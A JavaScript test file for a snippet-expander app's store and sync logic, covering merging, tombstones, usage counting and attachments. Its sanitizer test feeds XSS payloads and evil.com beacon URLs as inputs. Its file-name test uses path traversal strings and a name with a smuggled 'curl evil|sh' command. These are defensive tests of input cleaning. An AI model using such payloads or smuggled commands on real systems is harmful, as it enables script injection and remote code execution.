'use strict';

// Tests for merge/parse (store.js) and file-based sync (sync.js).
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { mergeSnippets, parseLibrary, normalizeSnippet, sanitizeUntrustedHtml, mergeSnippetsForSync, Store } = require('../src/store');
const { fetchTeamLibrary, writeTeamLibrary, looksLikeUrl } = require('../src/sync');

let passed = 0;
function test(name, fn) {
  const done = () => { passed++; console.log('  ok  ' + name); };
  try {
    const r = fn();
    if (r && r.then) return r.then(done).catch((e) => { console.error('FAIL  ' + name + '\n      ' + e.message); process.exitCode = 1; });
    done();
  } catch (e) { console.error('FAIL  ' + name + '\n      ' + e.message); process.exitCode = 1; }
}

test('normalizeSnippet rejects junk, keeps valid', () => {
  assert.strictEqual(normalizeSnippet(null), null);
  assert.strictEqual(normalizeSnippet({ replacement: 'x' }), null); // no trigger
  const s = normalizeSnippet({ trigger: ' ;a ', replacement: 'hi' }, 'team');
  assert.strictEqual(s.trigger, ';a'); // trimmed
  assert.strictEqual(s.origin, 'team');
});

test('mergeSnippets: personal wins by default', () => {
  const merged = mergeSnippets(
    [{ trigger: ';x', replacement: 'MINE' }],
    [{ trigger: ';x', replacement: 'TEAM' }, { trigger: ';y', replacement: 'TEAMY' }]
  );
  const map = Object.fromEntries(merged.map((s) => [s.trigger, s.replacement]));
  assert.strictEqual(map[';x'], 'MINE');
  assert.strictEqual(map[';y'], 'TEAMY');
  assert.strictEqual(merged.length, 2);
});

test('mergeSnippets: teamWins flips the conflict winner', () => {
  const merged = mergeSnippets(
    [{ trigger: ';x', replacement: 'MINE' }],
    [{ trigger: ';x', replacement: 'TEAM' }],
    { teamWins: true }
  );
  assert.strictEqual(merged[0].replacement, 'TEAM');
});

test('parseLibrary accepts {snippets:[...]} and bare arrays', () => {
  assert.strictEqual(parseLibrary('{"snippets":[{"trigger":";a","replacement":"1"}]}').length, 1);
  assert.strictEqual(parseLibrary('[{"trigger":";b","replacement":"2"}]').length, 1);
  assert.strictEqual(parseLibrary('{"snippets":[]}').length, 0);
});

test('looksLikeUrl distinguishes URLs from paths', () => {
  assert.strictEqual(looksLikeUrl('https://example.com/x.json'), true);
  assert.strictEqual(looksLikeUrl('/Users/me/Dropbox/Team'), false);
});

test('writeTeamLibrary + fetchTeamLibrary round-trips via a folder', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tte-'));
  writeTeamLibrary(dir, [{ trigger: ';hello', replacement: 'Hi there' }]);
  const res = await fetchTeamLibrary(dir); // folder -> reads team-library.json
  assert.strictEqual(res.snippets.length, 1);
  assert.strictEqual(res.snippets[0].trigger, ';hello');
  assert.strictEqual(res.snippets[0].origin, 'team');
});

test('fetchTeamLibrary errors clearly on a missing source', async () => {
  let threw = false;
  try { await fetchTeamLibrary(''); } catch (e) { threw = true; }
  assert.strictEqual(threw, true);
});

test('free-tier counter: local buffer + server reconciliation', () => {
  const data = {};
  const store = new Store({ get: (k, d) => (k in data ? data[k] : d), set: (k, v) => { data[k] = v; } });
  const eff = () => store.getDailyUsage().count;

  assert.strictEqual(eff(), 0);
  store.bumpDailyUsage(); store.bumpDailyUsage();
  assert.strictEqual(eff(), 2);
  assert.strictEqual(store.pendingFreeDelta(), 2);         // not yet on server

  store.setServerUsage(2);                                 // server acknowledges the flush
  assert.strictEqual(store.pendingFreeDelta(), 0);

  store.setServerUsage(5);                                 // another device used more
  assert.strictEqual(eff(), 5, 'adopts a higher server count');

  // Clearing local data must not grant a fresh allowance once the server knows.
  for (const k in data) delete data[k];
  store.setServerUsage(5);
  assert.strictEqual(eff(), 5, 'server count survives a cleared local store');

  store.bumpDailyUsage();                                  // one offline use
  assert.strictEqual(eff(), 6);
  assert.strictEqual(store.pendingFreeDelta(), 1);

  // A UTC-day rollover resets the effective count to 0.
  const y = new Date(Date.now() - 24 * 60 * 60 * 1000);
  const yk = y.getUTCFullYear() + '-' + String(y.getUTCMonth() + 1).padStart(2, '0') + '-' + String(y.getUTCDate()).padStart(2, '0');
  data.dailyUsage = { date: yk, local: 99, server: 99 };
  assert.strictEqual(eff(), 0, 'yesterday\'s count does not carry over');
});

test('parseLibrary tolerates null/garbage without crashing', () => {
  assert.deepStrictEqual(parseLibrary('null'), []);
  assert.deepStrictEqual(parseLibrary('42'), []);
  assert.deepStrictEqual(parseLibrary('"a string"'), []);
  assert.deepStrictEqual(parseLibrary(null), []);
  assert.throws(() => parseLibrary('<html>not json</html>'), /not valid JSON/);
});

test('sanitizeUntrustedHtml neutralizes handler/scheme/remote bypasses', () => {
  const S = sanitizeUntrustedHtml;
  assert(!/onerror/i.test(S('<img/onerror=alert(1) src=x>')), 'slash-separated handler');
  assert(!/onload/i.test(S('<svg/onload=alert(1)>')), 'svg wrapper + handler');
  assert(!/javascript:/i.test(S('<a href=javascript:alert(1)>x</a>')), 'unquoted javascript: href');
  assert(!/ascript/i.test(S('<a href="jav&#9;ascript:alert(1)">x</a>')), 'entity/tab-obfuscated scheme');
  assert(!/evil\.com/i.test(S('<img src=//evil.com/beacon.png>')), 'unquoted remote beacon');
  assert(!/evil\.com/i.test(S('<div style=background:url(//evil.com)>x</div>')), 'unquoted inline style');
  // Self-contained data: images are still allowed through.
  assert(/data:image\/png/i.test(S('<img src="data:image/png;base64,AAAA">')), 'keeps inline data image');
});

test('mergeSnippetsForSync: remote-only snippet is adopted, not pushed', () => {
  const now = Date.now();
  const r = mergeSnippetsForSync({ live: [], tombstones: [], now,
    remote: [{ id: 'a', trigger: ';a', replacement: 'A', updated_at: now - 1000, deleted_at: null }] });
  assert.strictEqual(r.live.length, 1);
  assert.strictEqual(r.live[0].trigger, ';a');
  assert.strictEqual(r.push.length, 0);
});

test('mergeSnippetsForSync: local-only snippet is pushed', () => {
  const now = Date.now();
  const r = mergeSnippetsForSync({ tombstones: [], remote: [], now,
    live: [{ id: 'b', trigger: ';b', replacement: 'B', updatedAt: now - 500 }] });
  assert.strictEqual(r.push.length, 1);
  assert.strictEqual(r.push[0].id, 'b');
  assert.strictEqual(r.push[0].deleted_at, null);
  assert.strictEqual(r.live.length, 1);
});

test('mergeSnippetsForSync: newer side wins (local newer => push, remote newer => adopt)', () => {
  const now = Date.now();
  const localWins = mergeSnippetsForSync({ tombstones: [], now,
    live: [{ id: 'c', trigger: ';c', replacement: 'NEW', updatedAt: now }],
    remote: [{ id: 'c', trigger: ';c', replacement: 'OLD', updated_at: now - 1000, deleted_at: null }] });
  assert.strictEqual(localWins.live[0].replacement, 'NEW');
  assert.strictEqual(localWins.push.length, 1);

  const remoteWins = mergeSnippetsForSync({ tombstones: [], now,
    live: [{ id: 'd', trigger: ';d', replacement: 'OLD', updatedAt: now - 1000 }],
    remote: [{ id: 'd', trigger: ';d', replacement: 'NEW', updated_at: now, deleted_at: null }] });
  assert.strictEqual(remoteWins.live[0].replacement, 'NEW');
  assert.strictEqual(remoteWins.push.length, 0);
});

test('mergeSnippetsForSync: deletions propagate both ways via tombstones', () => {
  const now = Date.now();
  // remote deletion (newer) removes the local live snippet
  const remoteDel = mergeSnippetsForSync({ tombstones: [], now,
    live: [{ id: 'e', trigger: ';e', replacement: 'X', updatedAt: now - 1000 }],
    remote: [{ id: 'e', trigger: ';e', updated_at: now, deleted_at: now }] });
  assert.strictEqual(remoteDel.live.length, 0);
  assert.strictEqual(remoteDel.tombstones.length, 1);
  assert.strictEqual(remoteDel.push.length, 0);

  // local deletion (newer) is pushed and the remote-live row does not resurrect
  const localDel = mergeSnippetsForSync({ live: [], now,
    tombstones: [{ id: 'f', trigger: ';f', deletedAt: now }],
    remote: [{ id: 'f', trigger: ';f', replacement: 'X', updated_at: now - 1000, deleted_at: null }] });
  assert.strictEqual(localDel.live.length, 0);
  assert.strictEqual(localDel.push.length, 1);
  assert(localDel.push[0].deleted_at, 'pushes a deletion');
});

test('Store.setPersonal assigns ids, stamps updatedAt, and tombstones deletions', () => {
  const data = {};
  const store = new Store({ get: (k, d) => (k in data ? data[k] : d), set: (k, v) => { data[k] = v; } });

  store.setPersonal([{ trigger: ';a', replacement: 'A' }]);
  let p = store.getPersonal();
  assert.strictEqual(p.length, 1);
  assert(p[0].id, 'assigns a stable id');
  assert(p[0].updatedAt, 'stamps updatedAt');
  const id = p[0].id;
  const ts = p[0].updatedAt;

  // Re-saving unchanged content must NOT bump updatedAt (avoids sync churn).
  store.setPersonal(store.getPersonal());
  assert.strictEqual(store.getPersonal()[0].updatedAt, ts, 'unchanged keeps timestamp');

  // Editing content bumps updatedAt.
  store.setPersonal([{ id, trigger: ';a', replacement: 'A2' }]);
  assert.notStrictEqual(store.getPersonal()[0].updatedAt, ts, 'edit bumps timestamp');

  // Deleting leaves a tombstone keyed by the same id.
  store.setPersonal([]);
  assert.strictEqual(store.getPersonal().length, 0);
  assert.strictEqual(store.getSnippetTombstones().length, 1);
  assert.strictEqual(store.getSnippetTombstones()[0].id, id);

  // Re-adding the same id cancels the tombstone.
  store.setPersonal([{ id, trigger: ';a', replacement: 'A' }]);
  assert.strictEqual(store.getSnippetTombstones().length, 0);
});

console.log('\nsync: ' + passed + ' passed');

test('Store.ensurePersonalIds backfills ids so legacy snippets sync instead of vanishing', () => {
  const data = { personalSnippets: [
    { trigger: ',a', replacement: 'A' },                                        // legacy: no id
    { id: 'abc', trigger: ',b', replacement: 'B', updatedAt: '2026-01-01T00:00:00.000Z' }, // non-UUID id
    { id: '11111111-2222-4333-8444-555555555555', trigger: ',c', replacement: 'C', updatedAt: '2026-01-01T00:00:00.000Z' },
  ] };
  const store = new Store({ get: (k, d) => (k in data ? data[k] : d), set: (k, v) => { data[k] = v; } });
  assert.strictEqual(store.ensurePersonalIds(), 2);
  const list = store.getPersonal();
  const UUID = /^[0-9a-f-]{36}$/i;
  assert.ok(list.every((s) => UUID.test(s.id)));
  assert.strictEqual(list[2].id, '11111111-2222-4333-8444-555555555555'); // valid ids untouched
  // The merge now keeps all three and pushes the two the cloud has never seen.
  const merged = mergeSnippetsForSync({ live: list, tombstones: [], remote: [
    { id: '11111111-2222-4333-8444-555555555555', trigger: ',c', replacement: 'C', enabled: true,
      updated_at: '2026-01-01T00:00:00.000Z', deleted_at: null },
  ], now: Date.now() });
  assert.strictEqual(merged.live.length, 3);
  assert.strictEqual(merged.push.length, 2);
  assert.strictEqual(store.ensurePersonalIds(), 0); // idempotent
});

test('mergeSnippetsForSync: same trigger under two ids collapses to the cloud id (newer wins)', () => {
  const now = Date.parse('2026-10-26T12:00:00Z');
  const local = [
    { id: '11111111-1111-4111-8111-111111111111', trigger: ',ch', replacement: 'Checking (pc)', updatedAt: '2026-10-26T10:00:00.000Z' },
    { id: '22222222-2222-4222-8222-222222222222', trigger: ',gm', replacement: 'Morning (pc, old)', updatedAt: '2026-10-01T10:00:00.000Z' },
  ];
  const remote = [
    { id: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa', trigger: ',ch', replacement: 'Checking (phone)', enabled: true, updated_at: '2026-10-07T20:00:00.000Z', deleted_at: null },
    { id: 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb', trigger: ',GM', replacement: 'Good morning team!', enabled: true, updated_at: '2026-10-07T20:00:00.000Z', deleted_at: null },
  ];
  const m = mergeSnippetsForSync({ live: local, tombstones: [], remote, now });
  assert.strictEqual(m.live.length, 2, 'no duplicates');
  const ch = m.live.find((s) => s.trigger === ',ch');
  assert.strictEqual(ch.id, 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa');
  assert.strictEqual(ch.replacement, 'Checking (pc)'); // local was newer
  assert.strictEqual(m.push.length, 1);
  assert.strictEqual(m.push[0].id, 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa');
  const gm = m.live.find((s) => s.trigger.toLowerCase() === ',gm');
  assert.strictEqual(gm.replacement, 'Good morning team!'); // cloud was newer
});

test('Store.adoptForAccount re-keys snippets only when a different account signs in', () => {
  const data = { personalSnippets: [{ id: '11111111-1111-4111-8111-111111111111', trigger: ',a', replacement: 'A' }],
    snippetTombstones: [{ id: '33333333-3333-4333-8333-333333333333', deletedAt: '2026-10-01T00:00:00.000Z' }] };
  const store = new Store({ get: (k, d) => (k in data ? data[k] : d), set: (k, v) => { data[k] = v; } });
  assert.strictEqual(store.adoptForAccount('user-a'), false); // first account: keep as-is
  assert.strictEqual(store.getPersonal()[0].id, '11111111-1111-4111-8111-111111111111');
  assert.strictEqual(store.adoptForAccount('user-a'), false);
  assert.strictEqual(store.adoptForAccount('user-b'), true);
  assert.notStrictEqual(store.getPersonal()[0].id, '11111111-1111-4111-8111-111111111111');
  assert.strictEqual(store.getSnippetTombstones().length, 0);
});

test('usage stats count uses per snippet and characters saved, and survive an account re-key', () => {
  const data = {};
  const store = new Store({ get: (k, d) => (k in data ? data[k] : d), set: (k, v) => { data[k] = v; } });
  store.setPersonal([{ trigger: ';addr', replacement: '221 Market Street, Suite 400' }]);
  const id = store.getPersonal()[0].id;
  store.recordUse(id, 5, 28, Date.parse('2026-10-01T00:00:00Z'));
  store.recordUse(id, 5, 28, Date.parse('2026-10-02T00:00:00Z'));
  store.recordUse('t:;team', 5, 2); // shorter than the trigger: saves nothing
  const u = store.getUsageStats();
  assert.strictEqual(u.byKey[id].count, 2);
  assert.strictEqual(u.byKey[id].lastUsedAt, '2026-10-02T00:00:00.000Z');
  assert.strictEqual(u.totals.expansions, 3);
  assert.strictEqual(u.totals.savedChars, 46);
  assert.strictEqual(u.totals.since, '2026-10-01T00:00:00.000Z');
  const created = store.ensureSnippetCreated();
  assert.ok(created[id]);
  store.adoptForAccount('a'); store.adoptForAccount('b');
  const nid = store.getPersonal()[0].id;
  assert.notStrictEqual(nid, id);
  assert.strictEqual(store.getUsageStats().totals.expansions, 0); // other account: usage starts fresh
  assert.strictEqual(store.getSnippetCreated()[nid], created[id]);
});

test('combineUsage adds counts across devices and ignores this device\'s stale cloud row', () => {
  const { combineUsage } = require('../src/store');
  const local = { byKey: { a: { count: 3, lastUsedAt: '2026-10-02T00:00:00Z' } }, totals: { expansions: 3, savedChars: 60, typedChars: 9, since: '2026-10-01T00:00:00Z' } };
  const rows = [
    { device_id: 'me', by_key: { a: { count: 1 } }, totals: { expansions: 1, savedChars: 20 } },
    { device_id: 'phone', by_key: { a: { count: 5, lastUsedAt: '2026-10-05T00:00:00Z' }, b: { count: 2 } }, totals: { expansions: 7, savedChars: 140, since: '2026-09-20T00:00:00Z' } },
  ];
  const c = combineUsage(local, rows, 'me');
  assert.strictEqual(c.byKey.a.count, 8);
  assert.strictEqual(c.byKey.a.lastUsedAt, '2026-10-05T00:00:00Z');
  assert.strictEqual(c.byKey.b.count, 2);
  assert.strictEqual(c.totals.expansions, 10);
  assert.strictEqual(c.totals.savedChars, 200);
  assert.strictEqual(c.totals.since, '2026-09-20T00:00:00Z');
  assert.strictEqual(c.totals.devices, 2);
});

test('sync never drops an image/file just because the newer copy lacks it (same id or same trigger)', () => {
  const att = { type: 'image', name: 'a.png', mime: 'image/png', data: 'iVBORw0KGgo=' };
  const A = '11111111-1111-4111-8111-111111111111';
  const B = '22222222-2222-4222-8222-222222222222';
  // Same id: this PC has a newer text-only copy, the cloud has the image.
  let m = mergeSnippetsForSync({
    live: [{ id: A, trigger: ';ty', replacement: 'Thanks!', updatedAt: '2026-10-28T10:00:00Z' }],
    remote: [{ id: A, trigger: ';ty', replacement: 'Thanks', attachment: att, updated_at: '2026-10-27T10:00:00Z' }],
  });
  assert.deepStrictEqual(m.live[0].attachment, att);
  assert.deepStrictEqual(m.push[0].attachment, att);
  // Same id: the cloud copy is newer but has no image; this PC has it -> kept and re-pushed.
  m = mergeSnippetsForSync({
    live: [{ id: A, trigger: ';ty', replacement: 'Thanks', attachment: att, updatedAt: '2026-10-27T10:00:00Z' }],
    remote: [{ id: A, trigger: ';ty', replacement: 'Thanks!!', attachment: null, updated_at: '2026-10-28T10:00:00Z' }],
  });
  assert.strictEqual(m.live[0].replacement, 'Thanks!!');
  assert.deepStrictEqual(m.live[0].attachment, att);
  assert.strictEqual(m.push.length, 1);
  // Same trigger, different ids: cloud has the image, this PC's newer copy doesn't.
  m = mergeSnippetsForSync({
    live: [{ id: B, trigger: ';TY', replacement: 'Thanks!', updatedAt: '2026-10-28T10:00:00Z' }],
    remote: [{ id: A, trigger: ';ty', replacement: 'Thanks', attachment: JSON.stringify(att), updated_at: '2026-10-27T10:00:00Z' }],
  });
  assert.strictEqual(m.live.length, 1);
  assert.strictEqual(m.live[0].id, A);
  assert.deepStrictEqual(m.live[0].attachment, att);
  // Removed on purpose in the editor: stays removed.
  m = mergeSnippetsForSync({
    live: [{ id: A, trigger: ';ty', replacement: 'Thanks', attachmentCleared: true, updatedAt: '2026-10-28T10:00:00Z' }],
    remote: [{ id: A, trigger: ';ty', replacement: 'Thanks', attachment: att, updated_at: '2026-10-27T10:00:00Z' }],
  });
  assert.strictEqual(m.live[0].attachment, undefined);
  assert.strictEqual(m.push[0].attachment, null);
});

test('safeFileName strips paths and shell characters from shared attachment names', () => {
  const { safeFileName } = require('../src/store');
  assert.strictEqual(safeFileName('..\\..\\Startup\\x.bat'), 'x.bat');
  assert.strictEqual(safeFileName('../../etc/passwd'), 'passwd');
  assert.ok(!/['";|&$`]/.test(safeFileName("a'; curl evil|sh; echo '.txt")));
  assert.strictEqual(safeFileName(''), 'attachment');
});
